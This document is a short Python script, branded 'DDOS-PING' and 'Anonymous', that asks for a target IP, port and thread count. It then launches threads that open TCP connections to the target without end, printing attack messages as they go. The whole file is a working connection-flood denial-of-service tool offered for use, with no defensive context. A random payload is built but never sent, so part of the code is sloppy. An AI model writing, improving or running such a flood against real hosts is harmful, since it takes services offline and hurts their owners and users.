#!/usr/bin/env python3

import random
import socket
import threading

print("|----DDOS-PING----|")
print("|----Anonymous----|")
ip = str(input(" IP:"))
port = int(input(" PORT:"))      # The port used by the server
threads = int(input("PING:"))


def run():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			for x in range(1):
				s.connect((ip,port))
                
				
			print("[+] ATTACK TO", ip, port, "PING EXPORT =", threads)
			
for Y in range(threads):
		th = threading.Thread(target = run)
		th.start()